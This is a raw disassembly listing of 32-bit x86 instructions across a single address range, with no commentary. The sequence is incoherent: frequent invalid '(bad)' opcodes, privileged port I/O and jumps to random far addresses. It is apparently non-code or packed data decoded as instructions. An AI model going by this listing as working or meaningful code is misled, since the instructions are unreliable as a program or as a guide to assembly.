  415059:	mov    eax,0x9998970f
  41505e:	push   ebx
  41505f:	jns    0x415025
  415061:	sbb    eax,DWORD PTR [edx+0x6c]
  415064:	cmp    DWORD PTR [edx+0x58c007a4],ebx
  41506a:	inc    ebx
  41506b:	mov    bh,0x4f
  41506d:	push   ebp
  41506e:	sub    DWORD PTR [edi+0x2],ebp
  415071:	repnz pop ss
  415073:	shl    DWORD PTR [ecx],cl
  415075:	and    ch,0x54
  415078:	faddp  st(1),st
  41507a:	mov    al,ds:0x5f3bbcb6
  41507f:	mov    ds:0xd6b771fc,eax
  415084:	out    dx,eax
  415085:	fldenv [ebp+0x31]
  415088:	push   es
  415089:	ja     0x415099
  41508b:	nop
  41508c:	shl    edx,0x7d
  41508f:	popa   
  415090:	xchg   edi,eax
  415091:	aaa    
  415092:	mov    esi,esp
  415094:	lds    ecx,FWORD PTR [esi-0x7]
  415097:	inc    edi
  415098:	pop    eax
  415099:	clc    
  41509a:	loopne 0x415099
  41509c:	and    al,0x65
  41509e:	fisub  WORD PTR [ebp-0x78]
  4150a1:	popa   
  4150a2:	es gs jmp 0x415090
  4150a6:	mov    cl,BYTE PTR [ebp+ecx*2+0x45]
  4150aa:	sbb    eax,0xae54ff36
  4150af:	rol    DWORD PTR [ebp+ecx*1+0x6a77a432],1
  4150b6:	or     bl,dl
  4150b8:	xchg   ch,ch
  4150ba:	mov    eax,DWORD PTR [edi-0x60]
  4150bd:	push   es
  4150be:	pop    ecx
  4150bf:	add    BYTE PTR [edi],bl
  4150c1:	sti    
  4150c2:	inc    esi
  4150c3:	xor    BYTE PTR [edi-0x74f50050],ah
  4150c9:	ins    BYTE PTR es:[edi],dx
  4150ca:	jne    0x41510a
  4150cc:	xchg   ebx,eax
  4150cd:	pop    esi
  4150ce:	mov    cl,0x41
  4150d0:	ret    0x6a54
  4150d3:	jle    0x41507d
  4150d5:	pop    edi
  4150d6:	imul   esi,DWORD PTR [eax-0x5e],0x5b
  4150da:	fdiv   st(1),st
  4150dc:	jmp    0x6201:0xda783f93
  4150e3:	outs   dx,DWORD PTR ds:[esi]
  4150e4:	sub    eax,0x7cddeb5a
  4150e9:	(bad)  
  4150ea:	fdivr  QWORD PTR [edi-0x76]
  4150ed:	imul   ebp,edx,0x66
  4150f0:	xchg   edi,eax
  4150f1:	pushf  
  4150f2:	and    DWORD PTR [esi+0x48],ebx
  4150f5:	xor    eax,0x67869b15
  4150fa:	jle    0x415126
  4150fc:	scas   eax,DWORD PTR es:[edi]
  4150fd:	bound  ebp,QWORD PTR [ecx]
  4150ff:	add    DWORD PTR [ebp+0x5b769a7a],esi
  415105:	(bad)  
  415106:	icebp  
  415107:	pusha  
  415108:	inc    esi
  415109:	ins    DWORD PTR es:[edi],dx
  41510a:	out    dx,eax
  41510b:	(bad)  
  41510c:	mov    ebp,eax
  41510e:	jns    0x4150d2
  415110:	mov    ch,0x5b
  415112:	cld    
  415113:	int3   
  415114:	out    dx,al
  415115:	rcl    DWORD PTR [si+0x70],1
  415119:	call   0x1f1e:0xc678de84
  415120:	repnz push edi
  415122:	inc    ecx
  415123:	mov    ah,0xbb
  415125:	cdq    
  415126:	mov    ebp,0x59db7b4a
  41512b:	jnp    0x4150cc
  41512d:	pop    ebp
  41512e:	(bad)  [ebp+0x16]
  415131:	aam    0xa6
  415133:	and    eax,0xab67c125
  415138:	lods   eax,DWORD PTR ds:[esi]
  415139:	dec    eax
  41513a:	lods   al,BYTE PTR ds:[esi]
  41513b:	and    dh,dl
  41513d:	outs   dx,BYTE PTR ds:[esi]
  41513e:	pop    ecx
  41513f:	mov    ?,WORD PTR [edx+0x48b95b9d]
  415145:	xor    al,BYTE PTR [esi+edi*1-0x5c]
  415149:	and    BYTE PTR [edi+0x60],bl
  41514c:	push   ecx
  41514d:	push   cs
  41514e:	dec    ebx
  41514f:	lods   eax,DWORD PTR ds:[esi]
  415150:	mov    ds:0x7cac04d1,al
  415155:	jmp    0xf0fbceac
  41515a:	in     eax,dx
  41515b:	rol    DWORD PTR [edx],cl
  41515d:	fwait
  41515e:	add    al,0xe1
  415160:	int3   
  415161:	in     eax,dx
  415162:	out    dx,eax
  415163:	xor    dh,BYTE PTR [ebx]
  415165:	jmp    0x415100
  415167:	icebp  
  415168:	mov    ebx,0xf85be6e3
  41516d:	cli    
  41516e:	aad    0xe4
  415170:	jmp    0xcdc2:0x9f1fd299
  415177:	jns    0x4151f3
  415179:	inc    esi
  41517a:	sbb    eax,0xfa892d81
  41517f:	xor    eax,0xca39198f
  415184:	out    dx,al
  415185:	mov    ds:0xb65ef65,eax
  41518a:	in     eax,0x59
  41518c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41518d:	adc    al,0xd0
  41518f:	push   ss
  415190:	pop    ds
  415191:	and    ebp,DWORD PTR [ecx]
  415193:	jp     0x41517a
  415195:	lahf   
  415196:	add    BYTE PTR [ebp+0x7c],dl
  415199:	mov    dh,0x30
  41519b:	iret   
  41519c:	inc    esp
  41519d:	pop    ecx
  41519e:	pop    ecx
  41519f:	in     al,0x38
  4151a1:	push   edx
  4151a2:	jl     0x4151d0
  4151a4:	icebp  
  4151a5:	sbb    DWORD PTR [edi-0x6f],esp
  4151a8:	ret    
  4151a9:	sbb    BYTE PTR [ebp+0x53aaef77],dh
  4151af:	dec    ebx
  4151b0:	cdq    
  4151b1:	hlt    
  4151b2:	aaa    
  4151b3:	int3   
  4151b4:	sbb    BYTE PTR [edi+0x0],cl
  4151b7:	lahf   
  4151b8:	sbb    ebx,DWORD PTR [ebx+edi*1-0x26]
  4151bc:	lock pop ecx
  4151be:	mov    dh,0xc8
  4151c0:	add    bl,dh
  4151c2:	inc    esi
  4151c3:	cmp    al,dl
  4151c5:	jns    0x41523e
  4151c7:	lods   al,BYTE PTR ds:[esi]
  4151c8:	sbb    ah,al
  4151ca:	dec    edx
  4151cb:	shl    DWORD PTR [eax+0x44],1
  4151ce:	ins    DWORD PTR es:[edi],dx
  4151cf:	sub    BYTE PTR [ebx-0x17],0x91
  4151d3:	sbb    DWORD PTR [ecx-0x12],esi
  4151d6:	retf   0x47cf
  4151d9:	jecxz  0x415176
  4151db:	add    ah,0x64
  4151de:	lea    eax,[ebx-0x9]
  4151e1:	xchg   edi,eax
  4151e2:	cmp    eax,0xc71e81ff
  4151e7:	jae    0x41521b
  4151e9:	mov    edi,0x717a8fce
  4151ee:	inc    eax
  4151ef:	dec    eax
  4151f0:	enter  0x9697,0x33
  4151f4:	ret    0x3403
  4151f7:	mov    esp,0x2c64a383
  4151fc:	pop    esp
  4151fd:	scas   al,BYTE PTR es:[edi]
  4151fe:	xchg   BYTE PTR [eax-0x591daac3],dh
  415204:	nop
  415205:	and    DWORD PTR [ebp-0x80],0xfffffff0
  415209:	push   es
  41520a:	pusha  
  41520b:	fscale 
  41520d:	in     al,dx
  41520e:	out    0x3,eax
  415210:	and    bl,dl
  415212:	int3   
  415213:	add    al,0x20
  415215:	(bad)  
  415216:	adc    BYTE PTR [ecx],cl
  415218:	jmp    edi
  41521a:	ficom  WORD PTR [edi]
  41521c:	repnz cmp al,0xcc
  41521f:	push   0xffffffcb
  415221:	call   0x3ef66c0f
  415226:	loop   0x41526d
  415228:	mov    ecx,0xf1e336de
  41522d:	and    dl,BYTE PTR [ebx-0x387132f3]
  415233:	lds    ecx,FWORD PTR [bx+0x503]
  415238:	repz hlt 
  41523a:	sub    al,0xe
  41523c:	ds in  eax,dx
  41523e:	leave  
  41523f:	out    0x41,al
  415241:	ins    DWORD PTR es:[edi],dx
  415242:	cs push edi
  415244:	or     eax,DWORD PTR [edx]
  415246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415247:	fcomip st,st(2)
  415249:	mov    dl,0xe7
  41524b:	add    esp,eax
  41524d:	dec    edx
  41524e:	inc    ebp
  41524f:	jecxz  0x415288
  415251:	icebp  
  415252:	xor    BYTE PTR [edx+0x50],dl
  415255:	test   eax,0xfb201a
  41525a:	xchg   edx,eax
  41525b:	popa   
  41525c:	mov    edi,0x20788ee8
  415261:	cld    
  415262:	lods   eax,DWORD PTR ds:[esi]
  415263:	jle    0x415251
  415265:	mov    ch,0xf5
  415267:	cmc    
  415268:	jmp    0x4152ac
  41526a:	es cdq 
  41526c:	int3   
  41526d:	and    BYTE PTR [ecx-0x50],cl
  415270:	dec    esp
  415271:	jge    0x415233
  415273:	in     al,0xb9
  415275:	xchg   DWORD PTR [edx+0x7f],edi
  415278:	fistp  DWORD PTR [edx+0x46]
  41527b:	enter  0x71df,0xf7
  41527f:	add    al,0xa0
  415281:	mov    bl,0x69
  415283:	sar    edi,cl
  415285:	je     0x415248
  415287:	pop    esp
  415288:	lods   al,BYTE PTR ds:[esi]
  415289:	pop    es
  41528a:	clc    
  41528b:	cmc    
  41528c:	push   ebx
  41528d:	ja     0x415291
  41528f:	xor    BYTE PTR ds:0x58d0a016,dh
  415295:	and    BYTE PTR [ebx+0x1b],bl
  415298:	jnp    0x4152f7
  41529a:	or     BYTE PTR [ebx+0x31],0xbf
  41529e:	sub    eax,0xb71862e6
  4152a3:	jp     0x415303
  4152a5:	outs   dx,BYTE PTR ds:[esi]
  4152a6:	pop    ecx
  4152a7:	std    
  4152a8:	(bad)
  4152ac:	repnz cmp al,0x4e
  4152af:	dec    edi
  4152b0:	(bad)  
  4152b1:	arpl   WORD PTR [edi-0x9],bp
  4152b4:	out    dx,eax
  4152b5:	mov    esi,0x67ae095f
  4152ba:	clc    
  4152bb:	sbb    esi,ebx
  4152bd:	xchg   ebp,eax
  4152be:	(bad)  
  4152bf:	sbb    al,0x6a
  4152c1:	pop    edx
  4152c2:	cmp    eax,0x508f7f7f
  4152c7:	jbe    0x415307
  4152c9:	lock mov WORD PTR [esi],es
  4152cc:	adc    eax,0x47791300
  4152d1:	mov    dh,0x60
  4152d3:	shl    ah,1
  4152d5:	push   0x1e81d648
  4152da:	add    eax,0x95896e19
  4152df:	sub    esi,esi
  4152e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152e2:	mov    BYTE PTR [ebx-0x6],dh
  4152e5:	popa   
  4152e6:	je     0x415342
  4152e8:	xor    BYTE PTR [ebx-0x4839e96e],0xda
  4152ef:	jbe    0x415284
  4152f1:	mov    WORD PTR [eax+0x1c537071],ss
  4152f7:	stos   BYTE PTR es:[edi],al
  4152f8:	je     0x4152a3
  4152fa:	xchg   ebx,eax
  4152fb:	icebp  
  4152fc:	inc    edx
  4152fd:	sbb    ch,BYTE PTR [ebx]
  4152ff:	inc    edi
  415300:	stc    
  415301:	pop    esi
  415302:	aam    0xb2
  415304:	dec    esi
  415305:	outs   dx,BYTE PTR ds:[esi]
  415306:	mov    ebp,0x125c2404
  41530b:	dec    ecx
  41530c:	enter  0x9ae8,0x69
  415310:	neg    BYTE PTR ds:0x3428f641
  415316:	xchg   edi,eax
  415317:	adc    BYTE PTR [ecx],cl
  415319:	xchg   ebp,eax
  41531a:	jg     0x415376
  41531c:	jb     0x4152ec
  41531e:	fist   WORD PTR [edx+0x3b168e9a]
  415324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415325:	mov    bl,0x4e
  415327:	mov    cl,0x7a
  415329:	jns    0x4152da
  41532b:	fidivr WORD PTR [ebx]
  41532d:	pop    edx
  41532e:	inc    edx
  41532f:	mov    ch,0x4
  415331:	fucomi st,st(0)
  415334:	push   ebx
  415335:	jne    0x41539c
  415337:	xchg   DWORD PTR [ebx],edi
  415339:	(bad)  
  41533a:	jecxz  0x4152e0
  41533c:	sbb    ah,BYTE PTR [esi-0x523369b1]
  415342:	push   esp
  415343:	sbb    eax,0x3638132a
  415348:	cld    
  415349:	das    
  41534a:	(bad)  
  41534b:	lock push 0xffffffe5
  41534e:	cli    
  41534f:	aam    0xcb
  415351:	mov    ah,0x29
  415353:	ret    
  415354:	fdivr  QWORD PTR [eax+0x7d]
  415357:	sub    ah,BYTE PTR [esi-0x1a]
  41535a:	jle    0x41536a
  41535c:	bound  edx,QWORD PTR [ecx-0x54fe5a46]
  415362:	loop   0x4153a2
  415364:	iret   
  415365:	mov    dh,BYTE PTR [edi+0x3c8a06d8]
  41536b:	mov    edx,0x50dc440c
  415370:	xchg   esp,eax
  415371:	push   ss
  415372:	pop    es
  415373:	cmp    cl,BYTE PTR [esi-0x56ce1e20]
  415379:	popf   
  41537a:	push   ebp
  41537b:	xchg   esi,ebp
  41537d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41537e:	dec    ecx
  41537f:	xlat   BYTE PTR ds:[ebx]
  415380:	sub    DWORD PTR [eax],ebx
  415382:	sub    al,0x75
  415384:	inc    edx
  415385:	mov    ebx,eax
  415387:	(bad)  
  415388:	adc    DWORD PTR [edi+0x23],eax
  41538b:	jbe    0x4153d1
  41538d:	jnp    0x415359
  41538f:	xlat   BYTE PTR ds:[ebx]
  415390:	jp     0x4153f4
  415392:	int3   
  415393:	cmp    BYTE PTR [edx+ebp*1-0x78],ah
  415397:	pop    ds
  415398:	push   eax
  415399:	test   DWORD PTR [eax+edi*4-0x52d3a0a8],eax
  4153a0:	or     BYTE PTR [ecx+0x72],bl
  4153a3:	lahf   
  4153a4:	or     BYTE PTR [ecx-0x3405d3d3],bl
  4153aa:	addr16 into 
  4153ac:	data16 (bad) 
  4153ae:	xlat   BYTE PTR ds:[ebx]
  4153af:	push   eax
  4153b0:	cs sbb eax,0xe07e6bc5
  4153b6:	or     BYTE PTR [ebx+eax*2],ah
  4153b9:	stos   DWORD PTR es:[edi],eax
  4153ba:	sub    edx,DWORD PTR [esi-0x26]
  4153bd:	xor    al,BYTE PTR [edi+eax*4+0x11]
  4153c1:	sbb    ebp,DWORD PTR [edx-0x77]
  4153c4:	xor    eax,0x4a4285d4
  4153c9:	mov    al,ds:0xf27dcb1e
  4153ce:	test   eax,0xf609639a
  4153d3:	aad    0xc2
  4153d5:	ins    DWORD PTR es:[edi],dx
  4153d6:	mov    esp,0x448424be
  4153db:	adc    eax,DWORD PTR [eax-0x622be73e]
  4153e1:	dec    edi
  4153e2:	mov    ebp,0x14a98fd3
  4153e7:	jb     0x4153cc
  4153e9:	add    ah,ch
  4153eb:	aam    0x3c
  4153ed:	inc    ecx
  4153ee:	xlat   BYTE PTR ds:[ebx]
  4153ef:	mov    WORD PTR [ecx+eax*2-0x9],?
  4153f3:	adc    al,0xc6
  4153f5:	pop    ecx
  4153f6:	loope  0x4153b8
  4153f8:	jge    0x41540b
  4153fa:	mov    ecx,0x5234e589
  4153ff:	shl    dh,1
  415401:	fnstcw WORD PTR [eax+0x3323cbb6]
  415407:	xchg   esi,eax
  415409:	inc    edx
  41540a:	mov    edi,0xfdee43f0
  41540f:	leave  
  415410:	popf   
  415411:	lds    esi,FWORD PTR [ebx]
  415413:	xchg   ebx,eax
  415414:	repnz jecxz 0x41542e
  415417:	(bad)  
  415418:	and    DWORD PTR [esi],esp
  41541a:	xor    edi,DWORD PTR [edx]
  41541c:	mov    dl,0x15
  41541e:	cmp    DWORD PTR [edi],ebx
  415420:	sti    
  415421:	mov    eax,0x1ac7febb
  415426:	mov    bl,0xe4
  415428:	xor    al,0x96
  41542a:	push   ecx
  41542b:	sub    eax,0xba954b49
  415430:	adc    BYTE PTR [edx-0x17fbd016],0xe8
  415437:	xchg   ebp,eax
  415438:	mov    edx,esp
  41543a:	add    BYTE PTR [ebx+ebp*4],ch
  41543d:	sub    dh,ch
  41543f:	mov    cl,0x9a
  415441:	test   al,0xf8
  415443:	jae    0x4154be
  415445:	(bad)  
  415446:	mov    ah,0xea
  415448:	ja     0x415427
  41544a:	push   esp
  41544b:	loopne 0x415494
  41544d:	ror    ah,0x97
  415450:	out    0x28,eax
  415452:	enter  0xa4ab,0x2f
  415456:	sub    al,0xee
  415458:	cdq    
  415459:	mov    ah,0xaf
  41545b:	push   esp
  41545c:	push   eax
  41545d:	mov    WORD PTR [edi],?
  41545f:	jge    0x415414
  415461:	daa    
  415462:	iret   
  415463:	(bad)  
  415465:	inc    edx
  415466:	fadd   st(5),st
  415468:	push   edi
  415469:	dec    edi
  41546a:	adc    bh,BYTE PTR [edi+0x109dadd6]
  415470:	inc    esi
  415471:	leave  
  415472:	arpl   WORD PTR [ebx+edi*2+0x1ae8db5e],sp
  415479:	(bad)  
  41547a:	or     BYTE PTR [edi-0x25],ch
  41547d:	push   ebx
  41547e:	push   ebx
  41547f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415480:	mov    BYTE PTR [ecx+0x37a8b8a8],al
  415486:	in     eax,dx
  415487:	daa    
  415488:	jle    0x4154ef
  41548a:	dec    esi
  41548b:	xor    bh,al
  41548d:	dec    ecx
  41548e:	mov    esp,0x155f8f72
  415493:	dec    edi
  415494:	jp     0x415508
  415496:	fidivr WORD PTR [ebx]
  415498:	or     ah,BYTE PTR [ecx+0x331298e4]
  41549e:	test   ah,ah
  4154a0:	adc    al,0xec
  4154a2:	xor    eax,0xf6c56b10
  4154a7:	inc    ebp
  4154a8:	or     BYTE PTR [eax-0x45c5a527],cl
  4154ae:	(bad)  
  4154af:	cdq    
  4154b0:	and    dl,BYTE PTR [ebx-0x666ae41]
  4154b6:	ja     0x415508
  4154b8:	adc    DWORD PTR [eax+0x5c],eax
  4154bb:	sub    BYTE PTR [ecx+eax*1+0x1d],dh
  4154bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154c0:	je     0x415539
  4154c2:	(bad)  
  4154c3:	fld    TBYTE PTR [edi-0x70]
  4154c6:	popf   
  4154c7:	(bad)  
  4154c8:	out    dx,eax
  4154c9:	pop    edi
  4154ca:	ret    0xbcfe
  4154cd:	dec    edi
  4154ce:	and    bl,ch
  4154d0:	adc    bl,BYTE PTR [ebx-0x54]
  4154d3:	pop    ebp
  4154d4:	pop    ecx
  4154d5:	sbb    edx,DWORD PTR [esi-0x4a]
  4154d8:	dec    ebx
  4154d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154da:	pop    ecx
  4154db:	les    ebx,FWORD PTR [esi+0x2d375636]
  4154e1:	cmp    al,0xd8
  4154e3:	icebp  
  4154e4:	int    0xdf
  4154e6:	dec    edi
  4154e7:	sub    DWORD PTR [edx],ebp
  4154e9:	lahf   
  4154ea:	inc    DWORD PTR [edi+0x73]
  4154ed:	sub    al,bh
  4154ef:	(bad)  [esi-0x65c1876e]
  4154f5:	adc    eax,0x7bd1c1b4
  4154fa:	push   esi
  4154fb:	jne    0x415555
  4154fd:	clc    
  4154fe:	xchg   DWORD PTR [ebx-0xf1dbe40],ebp
  415504:	je     0x41549c
  415506:	gs test ecx,ecx
  415509:	mov    dl,0x84
  41550b:	pusha  
  41550c:	pop    ss
  41550d:	test   BYTE PTR [edi+ebx*8-0xc],dh
  415511:	xchg   ebp,eax
  415512:	fs je  0x4154f1
  415515:	iret   
  415516:	sysret 
  415518:	push   eax
  415519:	mov    al,0x79
  41551b:	lahf   
  41551c:	cmp    DWORD PTR [ebx],edx
  41551e:	fst    DWORD PTR [esi-0x26c220be]
  415524:	sahf   
  415525:	push   ss
  415526:	jae    0x41559f
  415528:	or     DWORD PTR [ecx+0x46],edx
  41552b:	dec    edi
  41552c:	inc    esp
  41552d:	mov    dl,0xe2
  41552f:	test   al,0x8f
  415531:	aad    0x32
  415533:	sub    eax,0x6634e37c
  415538:	out    0x1d,al
  41553a:	aad    0xb5
  41553c:	cmp    dh,bl
  41553e:	jp     0x41556c
  415540:	sbb    BYTE PTR [eax+eax*1+0x4b],cl
  415544:	xchg   edx,eax
  415545:	mov    ebx,0xac6130e
  41554a:	jo     0x41556c
  41554c:	jge    0x4154fd
  41554e:	sub    al,0xe9
  415550:	push   ebx
  415551:	mov    bh,0x77
  415553:	(bad)  
  415554:	repz ret 
  415556:	cwde   
  415557:	mov    ecx,0x2619d91b
  41555c:	(bad)  
  41555e:	or     ch,BYTE PTR [edx]
  415560:	leave  
  415561:	daa    
  415562:	sub    eax,0x3f6a39a4
  415567:	inc    ecx
  415568:	bound  ebp,QWORD PTR [esi]
  41556a:	rcr    esp,0xcd
  41556d:	jo     0x415555
  41556f:	call   0x9fde:0xb6e643e3
  415576:	sub    BYTE PTR [ebx],cl
  415578:	loope  0x41559c
  41557a:	jg     0x415521
  41557c:	shr    DWORD PTR [ebx-0x50ff66e2],cl
  415582:	push   ebp
  415583:	rcr    BYTE PTR [ebp+edx*1-0x73],cl
  415587:	xor    cl,BYTE PTR [eax-0x25339419]
  41558d:	sbb    BYTE PTR [ebp-0x6a6f546],ch
  415593:	idiv   ebp
  415595:	fiadd  DWORD PTR [eax]
  415597:	out    0x34,eax
  415599:	sar    DWORD PTR [edi-0x26],1
  41559c:	xchg   edx,eax
  41559d:	(bad)  
  41559e:	leave  
  41559f:	push   ecx
  4155a0:	shr    DWORD PTR [eax],cl
  4155a2:	clc    
  4155a3:	and    edx,esi
  4155a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155a6:	xor    dh,BYTE PTR [esi]
  4155a8:	jbe    0x415545
  4155aa:	in     al,dx
  4155ab:	imul   esi,edx,0x61
  4155ae:	scas   al,BYTE PTR es:[edi]
  4155af:	ja     0x41558e
  4155b1:	(bad)  
  4155b2:	and    eax,0xf6ed8fae
  4155b7:	inc    eax
  4155b8:	mov    esi,0xcdf3c122
  4155bd:	into   
  4155be:	pop    ecx
  4155c0:	dec    esp
  4155c1:	pop    ebx
  4155c2:	or     al,0xd1
  4155c4:	and    edi,edi
  4155c6:	out    dx,eax
  4155c7:	jmp    0x759fb17b
  4155cc:	and    eax,0xe7105bd3
  4155d1:	outs   dx,DWORD PTR ds:[esi]
  4155d2:	out    dx,eax
  4155d3:	mov    cs,edx
  4155d5:	push   ds
  4155d6:	mov    al,0x8e
  4155d8:	add    eax,0x5c6fa3e
  4155dd:	outs   dx,BYTE PTR ds:[esi]
  4155de:	data16 cmp bl,cl
  4155e1:	xor    DWORD PTR [esi-0x4e419fd9],edi
  4155e7:	cmp    eax,0xceaf4f81
  4155ec:	xlat   BYTE PTR ds:[ebx]
  4155ed:	xor    esi,DWORD PTR [edi-0x4726dca4]
  4155f3:	test   DWORD PTR [edi],esi
  4155f5:	sub    al,0xc5
  4155f7:	cmp    al,0xe
  4155f9:	and    ebp,esi
  4155fb:	mov    ecx,0x885d7504
  415600:	loope  0x4155c6
  415602:	adc    ebp,DWORD PTR ds:0x2117e285
  415608:	dec    esi
  415609:	mov    esp,0xe7ff1c2b
  41560e:	rol    BYTE PTR [ecx-0x3f9e2afd],1
  415614:	ss mov edx,0x1e8167d8
  41561a:	int    0x17
  41561c:	mov    cl,al
  41561e:	mov    cl,0xbe
  415620:	icebp  
  415621:	or     DWORD PTR [edx-0x34a6a67d],0x39aab991
  41562b:	mov    ds:0x3b68dda9,eax
  415630:	or     ch,BYTE PTR [ecx-0x48]
  415633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415634:	xor    BYTE PTR [edi-0x713bab03],0xe9
  41563b:	iret   
  41563c:	sahf   
  41563d:	push   edx
  41563e:	(bad)  
  41563f:	fcomp  QWORD PTR [ebp+0x13]
  415642:	imul   edx,esi,0x6e
  415645:	pop    eax
  415646:	jmp    0xaa82:0xc6598005
  41564d:	mov    WORD PTR [edx+0x5ad61b87],ss
  415653:	sub    edx,DWORD PTR [edi-0x66]
  415656:	and    esp,esp
  415658:	cmp    eax,0x4bf6b57e
  41565d:	pop    ebx
  41565e:	cmp    DWORD PTR [eax],esi
  415660:	out    0x47,al
  415662:	ins    DWORD PTR es:[edi],dx
  415663:	sub    al,0xe4
  415665:	pop    esi
  415666:	dec    ebp
  415667:	inc    esi
  415668:	push   es
  415669:	xchg   ecx,eax
  41566a:	mov    edx,ss
  41566c:	cs inc edx
  41566e:	mov    edi,eax
  415670:	adc    eax,0xf6d23ead
  415675:	xor    eax,0x1e167a2
  41567a:	lds    esp,FWORD PTR [eax]
  41567c:	mov    ecx,0x45dd20d2
  415681:	(bad)  
  415682:	pop    ds
  415683:	ja     0x415605
  415685:	push   0xa5034e4f
  41568a:	xor    DWORD PTR [esi-0x6a],0x42
  41568e:	inc    ebx
  41568f:	xor    BYTE PTR [edx-0x25],bh
  415692:	mov    ds:0x5ae12963,eax
  415697:	lock jl 0x415711
  41569a:	test   ch,bh
  41569c:	adc    BYTE PTR [edx+0x49],ch
  41569f:	pop    DWORD PTR [ebx]
  4156a1:	push   0x493e3a64
  4156a6:	xor    bh,dh
  4156a8:	popa   
  4156a9:	mov    dl,0x27
  4156ab:	mov    BYTE PTR [eax-0x13],0xc0
  4156af:	mov    DWORD PTR [esi+0x46],esp
  4156b2:	inc    edi
  4156b3:	dec    esi
  4156b4:	arpl   WORD PTR [edi],sp
  4156b6:	cmp    al,0xa1
  4156b8:	test   DWORD PTR [esi+0x9],edx
  4156bb:	lock ror eax,cl
  4156be:	test   BYTE PTR [eax-0x43],al
  4156c1:	inc    edi
  4156c2:	inc    esi
  4156c3:	repz inc ebx
  4156c5:	fld    TBYTE PTR [edi]
  4156c7:	sbb    eax,0x9cb94e49
  4156cc:	sub    al,0xb9
  4156ce:	mov    esi,0x4b0865de
  4156d3:	jmp    0x467a:0x40376469
  4156da:	adc    al,0x46
  4156dc:	jmp    0xda4a4e88
  4156e1:	test   al,0xed
  4156e3:	imul   BYTE PTR [edx-0x48]
  4156e6:	les    ecx,FWORD PTR [esp+ebx*2]
  4156e9:	and    esp,ebp
  4156eb:	call   0xb00ded5b
  4156f0:	cs sahf 
  4156f2:	mov    ds:0x94407d65,eax
  4156f7:	sub    al,0xbc
  4156f9:	cmp    al,0x17
  4156fb:	mov    esi,0x490febc7
  415700:	and    al,0x1e
  415702:	cmp    BYTE PTR ds:0x269f1e06,0x4a
  415709:	repz inc eax
  41570b:	mov    ebp,ds
  41570d:	mov    dl,0xef
  41570f:	jno    0x415790
  415711:	mov    ch,0xbf
  415713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415714:	mov    ds:0xc4894ccc,al
  415719:	outs   dx,BYTE PTR ds:[esi]
  41571a:	pop    edx
  41571b:	es xchg cl,ah
  41571e:	pop    edx
  41571f:	shr    eax,0x7
  415722:	inc    eax
  415723:	mov    ds:0x8f6f5d12,al
  415728:	jnp    0x4156e6
  41572a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41572b:	loope  0x41578c
  41572d:	add    ch,BYTE PTR [ebx-0x7f]
  415730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415731:	jno    0x4156dc
  415733:	arpl   WORD PTR [edi-0x7d],cx
  415736:	cmp    ecx,esi
  415738:	sahf   
  415739:	in     al,0x48
  41573b:	push   ecx
  41573c:	adc    bh,BYTE PTR [eax*4-0x768ac1ac]
  415743:	loopne 0x41572b
  415745:	dec    eax
  415746:	(bad)  
  415747:	loope  0x4157a0
  415749:	and    edi,0x18d0d2c1
  41574f:	lods   al,BYTE PTR ds:[esi]
  415750:	sbb    al,0x4e
  415752:	xor    DWORD PTR [eax],esp
  415754:	and    eax,DWORD PTR [ecx-0x7901d26f]
  41575a:	pop    edx
  41575b:	inc    eax
  41575c:	loop   0x415752
  41575e:	jge    0x41573b
  415760:	dec    ebp
  415761:	add    esi,ebp
  415763:	daa    
  415764:	pop    eax
  415765:	sbb    eax,DWORD PTR [ebx+edx*4]
  415768:	daa    
  415769:	mov    eax,ds:0xad43ae7e
  41576e:	add    DWORD PTR ds:0x19b297e,0x81ae8bba
  415779:	mov    ebx,0xf56a132a
  41577e:	mov    ah,0x93
  415780:	retf   
  415781:	jge    0x415734
  415783:	mov    ds:0x6e7c55d,eax
  415788:	js     0x4157d2
  41578a:	and    al,0xf1
  41578c:	or     DWORD PTR [bx-0x10],edx
  415790:	es js  0x41573c
  415793:	inc    edx
  415794:	push   esp
  415795:	into   
  415796:	mov    ch,BYTE PTR [edx]
  415798:	mul    ecx
  41579a:	push   esi
  41579b:	in     al,0xc9
  41579d:	ds pop esp
  41579f:	adc    ecx,DWORD PTR [esi+0x6f]
  4157a2:	int3   
  4157a3:	xchg   edx,eax
  4157a4:	bound  edi,QWORD PTR cs:[eax+0x28]
  4157a8:	repnz inc edi
  4157aa:	and    BYTE PTR [edi+eax*4],ch
  4157ad:	jmp    0x69ccb108
  4157b2:	lea    ebx,[ecx+0x29ff69b5]
  4157b8:	dec    edi
  4157b9:	jl     0x41579f
  4157bb:	cmpxchg esp,ecx
  4157be:	xor    DWORD PTR gs:[edi-0x35],eax
  4157c2:	adc    dl,bl
  4157c4:	push   ebp
  4157c5:	pop    ebp
  4157c6:	jecxz  0x4157c0
  4157c8:	mov    ah,0xf8
  4157ca:	pop    esp
  4157cb:	push   ss
  4157cc:	stos   DWORD PTR es:[edi],eax
  4157cd:	mov    edi,0xfe13d079
  4157d2:	cmc    
  4157d3:	enter  0x6951,0xce
  4157d7:	push   esi
  4157d8:	and    BYTE PTR [eax+esi*1+0x394d67cb],al
  4157df:	sbb    BYTE PTR [eax],bl
  4157e1:	fidivr WORD PTR [eax-0x46]
  4157e4:	push   edx
  4157e5:	xchg   ecx,eax
  4157e6:	mov    bh,0xcc
  4157e8:	mov    ebx,0xdafcf05d
  4157ed:	sub    edx,DWORD PTR [ebp+eiz*1-0x13]
  4157f1:	push   ds
  4157f2:	xchg   esi,eax
  4157f3:	sub    eax,0x6b10143d
  4157f8:	pop    ds
  4157f9:	mov    ds:0xa77b818,al
  4157fe:	jns    0x4157fb
  415800:	data16 adc bl,BYTE PTR [edi]
  415803:	mov    ch,0x78
  415805:	and    BYTE PTR [edx],dl
  415807:	pop    ebx
  415808:	add    eax,0xbc242faa
  41580d:	mov    edx,DWORD PTR [ebx-0x72]
